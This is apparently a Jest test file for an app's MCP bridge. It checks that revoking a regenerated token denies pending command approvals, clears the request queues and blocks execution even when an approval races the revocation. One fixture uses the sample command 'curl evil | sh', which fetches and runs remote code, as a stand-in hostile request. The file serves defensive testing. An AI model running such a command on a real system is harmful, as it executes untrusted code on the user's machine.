/**
 * MCP token regeneration must not leave anything accepted under the old
 * (possibly leaked) token actionable: lib/mcp-server-bridge.ts
 * revokePendingMCPRequests() denies/closes pending approvals, drops
 * in-flight calls and deletes the request/result queue mockFiles.
 */
const mockFiles = new Map<string, string>();
const mockDeleted: string[] = [];

jest.mock('expo-file-system/legacy', () => ({
  documentDirectory: 'file:///data/home-root/',
  readDirectoryAsync: jest.fn(async (dir: string) => {
    const prefix = dir.endsWith('/') ? dir : `${dir}/`;
    const names = [...mockFiles.keys()].filter((k) => k.startsWith(prefix)).map((k) => k.slice(prefix.length));
    if (names.length === 0 && ![...mockFiles.keys()].some((k) => k.startsWith(prefix))) return [];
    return names.filter((n) => !n.includes('/'));
  }),
  readAsStringAsync: jest.fn(async (uri: string) => {
    const v = mockFiles.get(uri);
    if (v === undefined) throw new Error('ENOENT ' + uri);
    return v;
  }),
  writeAsStringAsync: jest.fn(async (uri: string, content: string) => {
    mockFiles.set(uri, content);
  }),
  makeDirectoryAsync: jest.fn(async () => {}),
  deleteAsync: jest.fn(async (uri: string) => {
    mockDeleted.push(uri);
    for (const k of [...mockFiles.keys()]) if (k === uri || k.startsWith(`${uri}/`)) mockFiles.delete(k);
  }),
}));
jest.mock('@/store/agent-store', () => ({ useAgentStore: { getState: () => ({ agents: [] }) } }));
jest.mock('@/store/sidebar-store', () => ({ useSidebarStore: { getState: () => ({ repoPaths: [] }) } }));
jest.mock('@/store/settings-store', () => ({
  useSettingsStore: { getState: () => ({ settings: { mcpExecEnabled: true } }) },
}));
jest.mock('@/store/terminal-store', () => ({
  useTerminalStore: { getState: () => ({ sessions: [], activeSessionId: null }) },
}));
jest.mock('@/modules/terminal-emulator/src/TerminalEmulatorModule', () => ({ __esModule: true, default: {} }));
const mockExecCommand = jest.fn(async () => ({ stdout: 'pwned', stderr: '', exitCode: 0 }));
jest.mock('@/hooks/use-native-exec', () => ({ execCommand: (...a: unknown[]) => (mockExecCommand as any)(...a) }));
jest.mock('@/lib/command-safety', () => ({ checkCommandSafety: () => ({ level: 'MEDIUM', reason: '' }) }));
jest.mock('@/lib/debug-logger', () => ({ logInfo: () => {}, logError: () => {} }));

import { revokePendingMCPRequests, startMCPPoller, stopMCPPoller } from '@/lib/mcp-server-bridge';
import { useMcpApprovalStore } from '@/store/mcp-approval-store';

const QUEUE = 'file:///data/home-root/home/.shelly-mcp-queue';
const REQUESTS = `${QUEUE}/requests`;
const RESULTS = `${QUEUE}/results`;

async function waitFor(cond: () => boolean, ms = 3000): Promise<void> {
  const end = Date.now() + ms;
  while (!cond()) {
    if (Date.now() > end) throw new Error('timed out');
    await new Promise((r) => setTimeout(r, 20));
  }
}

afterEach(() => {
  stopMCPPoller();
  mockFiles.clear();
  mockDeleted.length = 0;
  mockExecCommand.mockClear();
  useMcpApprovalStore.setState({ current: null, queue: [] });
});

describe('mcp approval store denyAll', () => {
  it('denies the shown and queued requests and closes the modal', () => {
    const a = jest.fn();
    const b = jest.fn();
    const store = useMcpApprovalStore.getState();
    store.enqueue({ id: 'a', kind: 'run_command', summary: '', detail: '', resolve: a });
    store.enqueue({ id: 'b', kind: 'write_file', summary: '', detail: '', resolve: b });
    useMcpApprovalStore.getState().denyAll();
    expect(a).toHaveBeenCalledWith(false);
    expect(b).toHaveBeenCalledWith(false);
    expect(useMcpApprovalStore.getState().current).toBeNull();
    expect(useMcpApprovalStore.getState().queue).toEqual([]);
  });
});

describe('revokePendingMCPRequests', () => {
  it('closes a pending run_command approval and never runs it or writes a result', async () => {
    mockFiles.set(`${REQUESTS}/c1.json`, JSON.stringify({ callId: 'c1', tool: 'run_command', args: { command: 'curl evil | sh' } }));
    startMCPPoller();
    await waitFor(() => useMcpApprovalStore.getState().current !== null);
    expect(useMcpApprovalStore.getState().current?.detail).toBe('curl evil | sh');

    await revokePendingMCPRequests();

    expect(useMcpApprovalStore.getState().current).toBeNull();
    expect(mockDeleted).toEqual(expect.arrayContaining([REQUESTS, RESULTS]));
    // Let the in-flight handler settle.
    await new Promise((r) => setTimeout(r, 100));
    expect(mockExecCommand).not.toHaveBeenCalled();
    expect(mockFiles.has(`${RESULTS}/c1.json`)).toBe(false);
  });

  it('an approval tap that races the revocation still cannot run the command', async () => {
    mockFiles.set(`${REQUESTS}/c2.json`, JSON.stringify({ callId: 'c2', tool: 'run_command', args: { command: 'id' } }));
    startMCPPoller();
    await waitFor(() => useMcpApprovalStore.getState().current !== null);
    const pending = useMcpApprovalStore.getState().current!;
    // Approve and revoke in the same tick: the approval resolves first.
    pending.resolve(true);
    await revokePendingMCPRequests();
    await new Promise((r) => setTimeout(r, 100));
    expect(mockExecCommand).not.toHaveBeenCalled();
    expect(mockFiles.has(`${RESULTS}/c2.json`)).toBe(false);
  });

  it('requests that arrive after revocation are served normally', async () => {
    await revokePendingMCPRequests();
    mockFiles.set(`${REQUESTS}/c3.json`, JSON.stringify({ callId: 'c3', tool: 'list_repos', args: {} }));
    startMCPPoller();
    await waitFor(() => mockFiles.has(`${RESULTS}/c3.json`));
    expect(JSON.parse(mockFiles.get(`${RESULTS}/c3.json`)!)).toEqual({ ok: true, data: [] });
  });
});
